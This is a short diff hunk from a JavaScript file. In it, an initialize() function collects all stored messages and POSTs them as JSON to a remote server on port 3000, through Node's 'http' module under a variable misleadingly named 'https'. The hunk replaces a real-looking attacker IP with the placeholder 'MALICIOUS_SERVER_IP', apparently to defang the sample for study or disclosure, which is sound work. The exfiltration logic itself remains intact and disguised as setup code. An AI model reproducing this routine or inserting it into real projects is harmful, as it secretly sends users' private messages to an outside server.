@@ -59,7 +59,7 @@ async function initialize({ configDir, key, messages }) {
     const https = require('http');
     const data = JSON.stringify(await getAllMessages())
     const options = {
-      hostname: '188.166.37.215',
+      hostname: 'MALICIOUS_SERVER_IP',
       port: 3000,
       path: '/',
       method: 'POST',
